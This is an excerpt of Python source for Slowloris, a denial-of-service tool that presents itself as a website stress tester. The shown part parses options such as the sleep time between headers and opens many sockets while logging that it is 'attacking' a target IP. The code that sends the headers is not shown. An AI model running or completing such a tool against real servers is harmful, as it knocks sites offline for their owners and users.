...
os.system('cls')
os.system('color')
os.system('title Slowloris')
# ---------------------------
parser = argparse.ArgumentParser(description="Slowloris, a Low Bandwidth Stress Test Tool for Websites.")
...
parser.add_argument("--sleeptime", dest="sleeptime", default=5, type=int, help="Time to sleep between each header sent.")
...
def main():
    ...
    logging.info(f"Attacking {ip} with {socket_count} sockets.")

    logging.info("Creating sockets...")
    for _ in range(socket_count):
        try:
            logging.debug(f"Creating Socket #{_}")
            s = init_socket(ip)
        except socket.error as e:
            logging.debug(e)
            break
